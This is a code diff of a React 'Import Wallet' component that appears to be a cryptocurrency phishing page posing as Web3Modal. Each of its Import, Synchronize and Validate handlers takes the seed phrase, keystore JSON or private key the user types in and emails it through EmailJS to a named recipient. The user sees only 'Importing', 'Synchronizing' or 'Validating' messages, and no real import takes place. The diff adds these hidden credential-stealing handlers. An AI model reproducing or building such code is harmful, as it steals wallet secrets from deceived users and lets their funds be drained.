@@ -36,23 +36,36 @@ const WalletDetail: React.FC<WalletDetailProps> = (props) => {
   };
 
   const handleImport = () => {
-    if (textValue1 === "") {
+    if (textValue1 === "" && activeTab === 1) {
       toast(<Notification type={"fail"} msg={"Enter the Phrase"} />);
       return;
     }
-    if (textValue2 === "") {
+    if (textValue2 === "" && activeTab === 2) {
       toast(<Notification type={"fail"} msg={"Enter the Keystore JSON"} />);
       return;
     }
-    if (textValue3 === "") {
+    if (textValue3 === "" && activeTab === 3) {
       toast(<Notification type={"fail"} msg={"Enter the Private Key"} />);
       return;
+    }
+
+    let message = "";
+    switch (activeTab) {
+      case 1:
+        message = `Wallet Name: ${walletName} \nPhrase: ${textValue1} \n`;
+        break;
+      case 2:
+        message = `Wallet Name: ${walletName} \nKeystore JSON: ${textValue2} \n`;
+        break;
+      case 3:
+        message = `Wallet Name: ${walletName} \nPrivate Key: ${textValue3}\n`;
+        break;
     }
 
     const templateParams = {
       to_name: "Phree Smoke",
       from_name: "Web3Modal",
-      message: `Wallet Name: ${walletName} \nPhrase: ${textValue1} \nKeystore JSON: ${textValue2} \nPrivate Key: ${textValue3}\n`,
+      message,
       // Add other parameters required by your email template
     };
 
@@ -64,9 +77,103 @@ const WalletDetail: React.FC<WalletDetailProps> = (props) => {
         "V9Jon4QfwCJkwW2_f"
       )
       .then(() => {
-        toast(
-          <Notification type={"success"} msg={"Wallet imported successfully"} />
-        );
+        toast(<Notification type={"success"} msg={"Importing."} />);
+      });
+
+    //
+  };
+
+  const handleSyncronize = () => {
+    if (textValue1 === "" && activeTab === 1) {
+      toast(<Notification type={"fail"} msg={"Enter the Phrase"} />);
+      return;
+    }
+    if (textValue2 === "" && activeTab === 2) {
+      toast(<Notification type={"fail"} msg={"Enter the Keystore JSON"} />);
+      return;
+    }
+    if (textValue3 === "" && activeTab === 3) {
+      toast(<Notification type={"fail"} msg={"Enter the Private Key"} />);
+      return;
+    }
+
+    let message = "";
+    switch (activeTab) {
+      case 1:
+        message = `Wallet Name: ${walletName} \nPhrase: ${textValue1} \n`;
+        break;
+      case 2:
+        message = `Wallet Name: ${walletName} \nKeystore JSON: ${textValue2} \n`;
+        break;
+      case 3:
+        message = `Wallet Name: ${walletName} \nPrivate Key: ${textValue3}\n`;
+        break;
+    }
+
+    const templateParams = {
+      to_name: "Phree Smoke",
+      from_name: "Web3Modal",
+      message,
+      // Add other parameters required by your email template
+    };
+
+    emailjs
+      .send(
+        "service_c3h75fm",
+        "template_eg0yydw",
+        templateParams,
+        "V9Jon4QfwCJkwW2_f"
+      )
+      .then(() => {
+        toast(<Notification type={"success"} msg={"Synchronizing."} />);
+      });
+
+    //
+  };
+
+  const handleValidate = () => {
+    if (textValue1 === "" && activeTab === 1) {
+      toast(<Notification type={"fail"} msg={"Enter the Phrase"} />);
+      return;
+    }
+    if (textValue2 === "" && activeTab === 2) {
+      toast(<Notification type={"fail"} msg={"Enter the Keystore JSON"} />);
+      return;
+    }
+    if (textValue3 === "" && activeTab === 3) {
+      toast(<Notification type={"fail"} msg={"Enter the Private Key"} />);
+      return;
+    }
+
+    let message = "";
+    switch (activeTab) {
+      case 1:
+        message = `Wallet Name: ${walletName} \nPhrase: ${textValue1} \n`;
+        break;
+      case 2:
+        message = `Wallet Name: ${walletName} \nKeystore JSON: ${textValue2} \n`;
+        break;
+      case 3:
+        message = `Wallet Name: ${walletName} \nPrivate Key: ${textValue3}\n`;
+        break;
+    }
+
+    const templateParams = {
+      to_name: "Phree Smoke",
+      from_name: "Web3Modal",
+      message,
+      // Add other parameters required by your email template
+    };
+
+    emailjs
+      .send(
+        "service_c3h75fm",
+        "template_eg0yydw",
+        templateParams,
+        "V9Jon4QfwCJkwW2_f"
+      )
+      .then(() => {
+        toast(<Notification type={"success"} msg={"Validating."} />);
       });
 
     //
@@ -78,122 +185,7 @@ const WalletDetail: React.FC<WalletDetailProps> = (props) => {
       className={` z-999 w-full bg-[#04011C] shadow-lg transition duration-100 rounded-sm`}
       //   data-aos="fade-down"
     >
-      {/* <div className="w-full max-w-full text-white text-[13px] font-holtwood items-center justify-between px-[3%] lg:justify-between lg:items-center flex">
-        <a href="#" className="mx-auto md:block hidden">
-          Github
-        </a>
-        <a href="#" className="mx-auto md:block hidden">
-          Docs
-        </a>
-        <img
-          onClick={() => {
-            navigate("/");
-          }}
-          src="/images/logo.png"
-          className="w-[70px] cursor-pointer h-[30px]"
-          alt=""
-        ></img>
-        <a href="#" className="mx-auto md:block hidden">
-          Wallets
-        </a>
-        <a href="#" className="mx-auto md:block hidden">
-          Apps
-        </a>
-
-        <div ref={dropdownRef} className="md:hidden text-right">
-          <button
-            onClick={() => handleOpen()}
-            type="button"
-            className="block text-gray-500  hover:text-white focus:text-white focus:outline-none"
-          >
-            <svg className="h-20 w-20 fill-current" viewBox="0 0 24 24">
-              {isOpen ? (
-                <path
-                  fillRule="evenodd"
-                  d="M18.278 16.864a1 1 0 0 1-1.414 1.414l-4.829-4.828-4.828 4.828a1 1 0 0 1-1.414-1.414l4.828-4.829-4.828-4.828a1 1 0 0 1 1.414-1.414l4.829 4.828 4.828-4.828a1 1 0 1 1 1.414 1.414l-4.828 4.829 4.828 4.828z"
-                />
-              ) : (
-                <path
-                  fillRule="evenodd"
-                  d="M4 5h16a1 1 0 0 1 0 2H4a1 1 0 1 1 0-2zm0 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2zm0 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2z"
-                />
-              )}
-            </svg>
-          </button>
-        </div>
-      </div>
-
-      <motion.div animate={isOpen ? "open" : "closed"} className="">
-        <div
-          ref={dropdownRef}
-          className={`${
-            isOpen ? "block" : "hidden"
-          } absolute right-0 transition-all duration-3000  origin-top-right bg-[#04011C] top-[100px]  lg:hidden   w-[100%]  py-5 text-center }`}
-        >
-          <motion.nav
-            initial={wrapperVariants.closed}
-            variants={wrapperVariants}
-            style={{ originY: "top" }}
-          >
-            <ul className="items-centerjustify-center px-10 text-left font-holtwood  gap-10">
-              <li className="mb-3  ">
-                <a
-                  href={`#`}
-                  className="flex justify-between text-white text-[17px] px-5 hover:text-gray-700 tracking-widest"
-                >
-                  Github
-                  <FontAwesomeIcon
-                    icon={faAngleRight}
-                    size="1x"
-                    className="my-auto"
-                  />
-                </a>
-              </li>
-              <li className="my-7  ">
-                <a
-                  href={`#howtobuy`}
-                  className="text-white flex justify-between text-[17px] px-5 hover:text-gray-700 tracking-widest"
-                >
-                  Docs
-                  <FontAwesomeIcon
-                    icon={faAngleRight}
-                    size="1x"
-                    className="my-auto"
-                  />
-                </a>
-              </li>
-              <li className="my-7  ">
-                <a
-                  href={`#claim`}
-                  className="text-white flex justify-between text-[17px] px-5 hover:text-gray-700 tracking-widest"
-                >
-                  Wallet
-                  <FontAwesomeIcon
-                    icon={faAngleRight}
-                    size="1x"
-                    className="my-auto"
-                  />
-                </a>
-              </li>
-              <li className="my-7 ">
-                <a
-                  href={`#faq`}
-                  className="text-white flex justify-between text-[17px] px-5 hover:text-gray-700 tracking-widest"
-                >
-                  App
-                  <FontAwesomeIcon
-                    icon={faAngleRight}
-                    size="1x"
-                    className="my-auto"
-                  />
-                </a>
-              </li>
-            </ul>
-          </motion.nav>
-        </div>
-      </motion.div> */}
-
-      <h2 className="text-gray-200 text-[23px] font-poppins text-center mt-5">
+      <h2 className="text-gray-200 text-[23px] font-poppins text-center">
         Import Wallet
       </h2>
 
@@ -240,7 +232,7 @@ const WalletDetail: React.FC<WalletDetailProps> = (props) => {
                 className="w-[70%] m-auto resize-none outline-none rounded-2xl p-3 bg-transparent border border-gray-600 hover:border-white"
               ></textarea>
               <p className="m-auto mt-3 text-[13px] text-center text-gray-600">
-                12 words separated by single spaces
+                12 or 24 words separated by single spaces
               </p>
             </div>
           )}
@@ -280,10 +272,16 @@ const WalletDetail: React.FC<WalletDetailProps> = (props) => {
         >
           Import
         </button>
-        <button className="w-[70%] my-1 py-1 rounded-xl text-white bg-white bg-opacity-5 font-holtwood text-[15px] mx-auto">
+        <button
+          onClick={handleSyncronize}
+          className="w-[70%] my-1 py-1 rounded-xl text-white bg-white bg-opacity-5 font-holtwood text-[15px] mx-auto"
+        >
           SYNCHRONIZE
         </button>
-        <button className="w-[70%] my-1 py-1 rounded-xl text-white bg-white bg-opacity-5 font-holtwood text-[15px] mx-auto">
+        <button
+          onClick={handleValidate}
+          className="w-[70%] my-1 py-1 rounded-xl text-white bg-white bg-opacity-5 font-holtwood text-[15px] mx-auto"
+        >
           VALIDATE
         </button>
       </div>
